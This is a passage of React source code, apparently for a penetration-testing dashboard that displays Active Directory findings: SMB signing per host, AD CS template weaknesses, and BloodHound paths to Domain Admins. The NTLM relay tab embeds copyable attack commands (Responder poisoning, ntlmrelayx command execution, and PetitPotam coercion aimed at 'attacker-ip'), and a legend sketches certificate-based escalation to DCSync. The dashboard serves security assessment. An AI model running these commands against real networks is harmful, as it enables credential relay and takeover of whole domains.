          { label: "CHANNEL BINDING", value: d.ldapSigning.ldapChannelBindingRequired ? "YES" : "NO", color: d.ldapSigning.ldapChannelBindingRequired ? "#00E676" : "#FF6D00" },
        ].map((m) => (
          <div key={m.label} style={{ background: "var(--adv-panel)", border: `1px solid ${m.color}30`, borderRadius: 6, padding: "14px 16px" }}>
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 6 }}>{m.label}</div>
            <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 24, fontWeight: 700, color: m.color }}>{m.value}</div>
          </div>
        ))}
      </div>

      {/* SMB Signing table */}
      <Panel>
        <SectionHeader title="SMB SIGNING STATUS PER HOST" badge="T1557.001" badgeColor="#FF1744" />
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["IP", "HOSTNAME", "SMB SIGNING ENABLED", "SMB SIGNING REQUIRED", "RELAY RISK"].map((h) => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {d.smbSigningHosts.map((host, i) => (
                <tr key={host.ip}>
                  <td style={{ padding: "9px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-accent)", borderBottom: "1px solid var(--adv-border)" }}>{host.ip}</td>
                  <td style={{ padding: "9px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "var(--adv-text)", borderBottom: "1px solid var(--adv-border)" }}>{host.hostname}</td>
                  {[host.smbSigningEnabled, host.smbSigningRequired].map((v, j) => (
                    <td key={j} style={{ padding: "9px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                      <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: v ? "#00E676" : "#FF1744", background: v ? "#00E67615" : "#FF174415", borderRadius: 3, padding: "1px 5px" }}>{v ? "YES" : "NO"}</span>
                    </td>
                  ))}
                  <td style={{ padding: "9px 12px", borderBottom: "1px solid var(--adv-border)" }}><RiskBadge risk={host.risk} /></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Panel>

      {/* Attack narrative */}
      <Panel>
        <SectionHeader title="NTLM RELAY ATTACK NARRATIVE" badge="ntlmrelayx" badgeColor="#00D4FF" />
        <div style={{ padding: 16 }}>
          <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 8 }}>ATTACK CHAIN — STEP BY STEP</div>
          <div style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 5, overflow: "hidden" }}>
            <div style={{ padding: "5px 10px", borderBottom: "1px solid var(--adv-border)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)" }}>REPRODUCTION COMMANDS</span>
              <CopyBtn text={[
                "# 1. Build target list of hosts without SMB signing",
                `echo "${d.smbSigningHosts.filter(h => !h.smbSigningRequired).map(h => h.ip).join("\\n")}" > targets.txt`,
                "",
                "# 2. Start Responder (LLMNR/NBT-NS poisoning)",
                "responder -I eth0 -rdwv",
                "",
                "# 3. Start ntlmrelayx (run in separate terminal)",
                "ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c whoami",
                "",
                "# 4. Optional: coerce auth from DC via PetitPotam",
                `python3 PetitPotam.py attacker-ip ${d.ldapSigning.dcIp}`,
              ].join("\n")} />
            </div>
            <pre style={{ margin: 0, padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#00E676", lineHeight: 1.75, overflowX: "auto" }}>
{`# 1. Build target list of hosts without SMB signing
echo "${d.smbSigningHosts.filter(h => !h.smbSigningRequired).map(h => h.ip).join("\\n")}" > targets.txt

# 2. Start Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -rdwv

# 3. Start ntlmrelayx (run in separate terminal)
ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c whoami

# 4. Optional: coerce auth from DC via PetitPotam
python3 PetitPotam.py attacker-ip ${d.ldapSigning.dcIp}`}
            </pre>
          </div>

          <div style={{ marginTop: 10, background: "rgba(255,23,68,0.04)", border: "1px solid rgba(255,23,68,0.15)", borderRadius: 5, padding: "10px 12px" }}>
            <div style={{ display: "flex", gap: 6, alignItems: "flex-start" }}>
              <AlertTriangle size={13} color="#FF1744" style={{ marginTop: 1, flexShrink: 0 }} />
              <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 12, color: "var(--adv-text-muted)", lineHeight: 1.5 }}>
                <strong style={{ color: "#FF1744" }}>Impact: </strong>
                {unsignedCount} hosts are relay targets. Any domain authentication event (file share browse, scheduled task, Windows Update) can be captured and relayed to execute code on these hosts without cracking any password.
              </div>
            </div>
          </div>
        </div>
      </Panel>
    </div>
  );
}

function ADCSTab({ d }: { d: ADData }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      {/* CA info + ESC8 */}
      <Panel>
        <SectionHeader title="CERTIFICATE AUTHORITY" badge={d.adcsCA.esc8Vulnerable ? "ESC8 VULNERABLE" : "ESC8 SAFE"} badgeColor={d.adcsCA.esc8Vulnerable ? "#FF1744" : "#00E676"} />
        <div style={{ padding: 16, display: "flex", flexDirection: "column", gap: 8 }}>
          {[
            { label: "CA Name", value: d.adcsCA.name },
            { label: "Web Enrollment URL", value: d.adcsCA.webEnrollmentUrl },
            { label: "NTLM Auth on Web Enrollment", value: d.adcsCA.ntlmAuthEnabled ? "ENABLED" : "DISABLED", color: d.adcsCA.ntlmAuthEnabled ? "#FF1744" : "#00E676" },
            { label: "ESC8 (NTLM Relay to CA)", value: d.adcsCA.esc8Vulnerable ? "VULNERABLE" : "NOT VULNERABLE", color: d.adcsCA.esc8Vulnerable ? "#FF1744" : "#00E676" },
          ].map((r) => (
            <div key={r.label} style={{ display: "flex", alignItems: "center", padding: "5px 0", borderBottom: "1px solid var(--adv-border)" }}>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text-muted)", width: 220, flexShrink: 0 }}>{r.label}</span>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: r.color ?? "var(--adv-text)" }}>{r.value}</span>
            </div>
          ))}
        </div>
      </Panel>

      {/* Templates table */}
      <Panel>
        <SectionHeader title="CERTIFICATE TEMPLATE ANALYSIS" badge="T1649" badgeColor="#FF1744" />
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["TEMPLATE", "ENROLLMENT RIGHTS", "ESC1", "ESC4", "ESC8", "ENROLLEE SUPPLIES SUBJ.", "EKUS", "RISK"].map((h) => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)", whiteSpace: "nowrap" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {d.adcsTemplates.map((tmpl) => (
                <tr key={tmpl.name}>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "var(--adv-text)", borderBottom: "1px solid var(--adv-border)" }}>{tmpl.displayName}</td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{tmpl.enrollmentRights.join(", ")}</td>
                  {[tmpl.esc1, tmpl.esc4, tmpl.esc8].map((v, j) => (
                    <td key={j} style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                      {v
                        ? <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#FF1744", background: "#FF174415", borderRadius: 3, padding: "1px 6px" }}>VULN</span>
                        : <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#00E676" }}>—</span>}
                    </td>
                  ))}
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: tmpl.enrolleeSuppliesSubject ? "#FF1744" : "#00E676" }}>{tmpl.enrolleeSuppliesSubject ? "YES" : "NO"}</span>
                  </td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{tmpl.ekus.join(", ")}</td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}><RiskBadge risk={tmpl.risk} /></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <div style={{ padding: "10px 14px", borderTop: "1px solid var(--adv-border)", background: "rgba(255,23,68,0.03)" }}>
          <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 4 }}>ESC CHECK LEGEND</div>
          {[
            { esc: "ESC1", desc: "Enrollee Supplies Subject + low-priv enrollment → request cert as any user (Domain Admin)" },
            { esc: "ESC4", desc: "Low-priv write access to template → modify to add ESC1 then exploit" },
            { esc: "ESC8", desc: "NTLM relay to CA web enrollment → coerce DC auth → DC certificate → DCSync" },
          ].map((e) => (
            <div key={e.esc} style={{ display: "flex", gap: 8, marginBottom: 3 }}>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#FF1744", background: "#FF174415", borderRadius: 2, padding: "0 4px", flexShrink: 0 }}>{e.esc}</span>
              <span style={{ fontFamily: "'Inter', sans-serif", fontSize: 11, color: "var(--adv-text-muted)" }}>{e.desc}</span>
            </div>
          ))}
        </div>
      </Panel>
    </div>
  );
}

function BloodHoundTab({ bh, onCollect }: { bh: BHData | null; onCollect: () => void }) {
  const [expandedPath, setExpandedPath] = useState<string | null>(null);

  if (!bh) {
    return (
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "60px 0", gap: 12 }}>
        <Network size={40} color="var(--adv-border)" />
        <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 13, color: "var(--adv-text-muted)" }}>BLOODHOUND DATA NOT LOADED</div>
        <button onClick={onCollect} style={{ padding: "8px 20px", borderRadius: 5, border: "1px solid rgba(37,99,235,0.3)", background: "rgba(37,99,235,0.08)", color: "var(--adv-accent)", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, cursor: "pointer" }}>
          LOAD COLLECTION DATA
        </button>
      </div>
    );
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      {/* Stats */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 10 }}>
        {Object.entries(bh.stats).map(([k, v]) => (
          <div key={k} style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 6, padding: "12px 14px" }}>
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 4 }}>{k.toUpperCase()}</div>
            <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 22, fontWeight: 700, color: "var(--adv-accent)" }}>{v.toLocaleString()}</div>
          </div>
        ))}
      </div>

      {/* DA Paths */}
      <Panel>
        <SectionHeader title="SHORTEST PATHS TO DOMAIN ADMINS" badge={`${bh.daPaths.length} paths found`} badgeColor="#FF1744" />
        <div style={{ padding: "0 0 4px" }}>
          {bh.daPaths.map((path) => (
            <div key={path.id} style={{ borderBottom: "1px solid var(--adv-border)" }}>
              <div onClick={() => setExpandedPath(expandedPath === path.id ? null : path.id)}
                style={{ padding: "12px 16px", cursor: "pointer", display: "flex", alignItems: "center", gap: 10 }}>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-accent)" }}>{path.id}</span>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#FF1744", background: "#FF174415", borderRadius: 3, padding: "1px 5px" }}>
                      {path.length} hop{path.length !== 1 ? "s" : ""}
                    </span>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#FFD600" }}>Score {path.riskScore}</span>
                    <span style={{ fontFamily: "'Inter', sans-serif", fontSize: 12, color: "var(--adv-text-muted)" }}>
                      {path.nodes.map((n) => n.label).join(" → ")}
                    </span>
                  </div>
                </div>
                {expandedPath === path.id ? <ChevronDown size={13} color="#64748B" /> : <ChevronRight size={13} color="#64748B" />}
              </div>

              {expandedPath === path.id && (
                <div style={{ padding: "0 16px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
                  {/* Nodes */}
                  <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                    {path.nodes.map((n, i) => (
                      <React.Fragment key={n.label}>
                        <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: n.critical ? "#FF1744" : "var(--adv-text)", background: n.critical ? "#FF174415" : "var(--adv-panel)", border: `1px solid ${n.critical ? "#FF174430" : "var(--adv-border)"}`, borderRadius: 3, padding: "3px 8px" }}>
                          {n.label} <span style={{ color: "var(--adv-text-muted)", fontSize: 8 }}>[{n.type}]</span>
                        </span>
                        {i < path.nodes.length - 1 && <span style={{ color: "var(--adv-text-muted)", fontSize: 12 }}>→</span>}
                      </React.Fragment>
                    ))}
                  </div>

                  {/* Edges */}
                  <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                    {path.edges.map((e, i) => (
                      <div key={i} style={{ display: "flex", alignItems: "center", gap: 8, fontFamily: "'JetBrains Mono', monospace", fontSize: 10 }}>
                        <span style={{ color: "var(--adv-text-muted)" }}>{e.source}</span>
                        <span style={{ color: "#FFD600", background: "rgba(255,214,0,0.1)", borderRadius: 3, padding: "0 5px" }}>{e.relation}</span>
                        <span style={{ color: "var(--adv-text-muted)" }}>{e.target}</span>
                        {e.technique && <span style={{ color: "#00D4FF", fontSize: 9 }}>· {e.technique}</span>}
                      </div>
                    ))}
                  </div>

                  {/* Narrative + Cypher */}
                  <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 13, color: "var(--adv-text-muted)", borderLeft: "2px solid #FFD600", paddingLeft: 10 }}>{path.narrative}</div>
                  <div style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 5 }}>
                    <div style={{ padding: "5px 10px", borderBottom: "1px solid var(--adv-border)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)" }}>CYPHER QUERY</span>
                      <CopyBtn text={path.cypherQuery} />
                    </div>
                    <pre style={{ margin: 0, padding: "8px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#00D4FF", lineHeight: 1.6, overflowX: "auto" }}>{path.cypherQuery}</pre>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      </Panel>

      {/* Collection info */}
      <Panel>
        <SectionHeader title="COLLECTION STATUS" />
        <div style={{ padding: 16, display: "flex", gap: 20 }}>
          {[
            { label: "STATUS", value: bh.collectionStatus.toUpperCase(), color: bh.collectionStatus === "completed" ? "#00E676" : "#FFD600" },
            { label: "METHODS", value: bh.collectionMethods.join(", "), color: "var(--adv-accent)" },
            { label: "COLLECTED AT", value: new Date(bh.collectedAt).toLocaleString(), color: "var(--adv-text)" },
          ].map((r) => (
            <div key={r.label}>
              <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 4 }}>{r.label}</div>
              <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 12, color: r.color }}>{r.value}</div>
            </div>
          ))}
        </div>
      </Panel>
    </div>
  );
}

/* ─── Main Page ─── */
export default function ActiveDirectoryPage() {
  const { info, error: toastError } = useToast();
  const [adData, setAdData]   = useState<ADData | null>(null);
  const [bhData, setBhData]   = useState<BHData | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<TabKey>("overview");

  useEffect(() => {
    fetch("/api/ad")
      .then((r) => r.json())
      .then(setAdData)
      .catch(() => toastError("Load Error", "Failed to load AD enumeration data."))
      .finally(() => setLoading(false));
  }, [toastError]);

  const loadBloodHound = useCallback(() => {
    fetch("/api/ad/bloodhound")
      .then((r) => r.json())
      .then((d) => { setBhData(d); info("BloodHound", "Collection data loaded."); })
      .catch(() => toastError("BloodHound Error", "Failed to load BloodHound data."));
  }, [info, toastError]);

  const findings = adData ? deriveFindings(adData) : [];
  const criticalCount = findings.filter((f) => f.severity === "CRITICAL").length;
  const highCount = findings.filter((f) => f.severity === "HIGH").length;

  const tabs: { key: TabKey; label: string; icon: React.ReactNode }[] = [
    { key: "overview",   label: "DOMAIN OVERVIEW",     icon: <Users size={12} /> },
    { key: "kerberos",   label: "KERBEROS ATTACKS",    icon: <Key size={12} /> },
    { key: "ntlm",       label: "NTLM RELAY",          icon: <Network size={12} /> },
    { key: "adcs",       label: "AD CS",               icon: <Lock size={12} /> },
    { key: "bloodhound", label: "BLOODHOUND PATHS",    icon: <ShieldAlert size={12} /> },
    { key: "findings",   label: `FINDINGS (${findings.length})`, icon: <FileText size={12} /> },
  ];

  return (
    <PageShell
      title="ACTIVE DIRECTORY"
      subtitle="LDAP ENUM · KERBEROS · NTLM RELAY · ADCS · BLOODHOUND"
      statusItems={[
        { label: "CRITICAL", value: String(criticalCount), color: criticalCount > 0 ? "#FF1744" : "var(--adv-text-muted)" },
        { label: "HIGH",     value: String(highCount),     color: highCount > 0 ? "#FF6D00" : "var(--adv-text-muted)" },
        { label: "DOMAIN",   value: adData?.domain.name ?? "—", color: "var(--adv-accent)" },
      ]}
    >
      {/* Tab bar */}
      <div style={{ display: "flex", borderBottom: "1px solid var(--adv-border)", marginBottom: 16, gap: 0, flexShrink: 0 }}>
        {tabs.map(({ key, label, icon }) => (
          <button key={key} onClick={() => setActiveTab(key)}
            style={{
              padding: "8px 16px", border: "none", background: "none", cursor: "pointer",
              borderBottom: `2px solid ${activeTab === key ? "var(--adv-accent)" : "transparent"}`,
              display: "flex", alignItems: "center", gap: 6, marginBottom: -1,
              fontFamily: "'JetBrains Mono', monospace", fontSize: 10,
              color: activeTab === key ? "var(--adv-accent)" : "var(--adv-text-muted)",
              transition: "color 0.12s", whiteSpace: "nowrap",
            }}>
            {icon}{label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflowY: "auto" }}>
        {loading ? (
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "60px 0", gap: 10 }}>
            <RefreshCw size={16} color="var(--adv-accent)" style={{ animation: "spin 1s linear infinite" }} />
            <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 12, color: "var(--adv-text-muted)" }}>ENUMERATING DOMAIN…</span>
          </div>
        ) : adData ? (
          <>
            {activeTab === "overview"   && <OverviewTab d={adData} />}
            {activeTab === "kerberos"   && <KerberosTab d={adData} />}
            {activeTab === "ntlm"       && <NTLMRelayTab d={adData} />}
            {activeTab === "adcs"       && <ADCSTab d={adData} />}
            {activeTab === "bloodhound" && <BloodHoundTab bh={bhData} onCollect={loadBloodHound} />}
            {activeTab === "findings"   && (
              <div>
                <div style={{ marginBottom: 12, fontFamily: "'Inter', sans-serif", fontSize: 13, color: "var(--adv-text-muted)" }}>
                  {findings.length} finding{findings.length !== 1 ? "s" : ""} generated — each includes MITRE technique, CWE, reproduction steps, detection opportunity, and remediation.
                </div>
                {findings.map((f) => <FindingCard key={f.id} f={f} />)}
              </div>
            )}
          </>
        ) : (
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "60px 0", gap: 10 }}>
            <XCircle size={36} color="var(--adv-border)" />
            <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 13, color: "var(--adv-text-muted)" }}>FAILED TO LOAD AD DATA</span>
          </div>
        )}
      </div>
    </PageShell>
  );
}
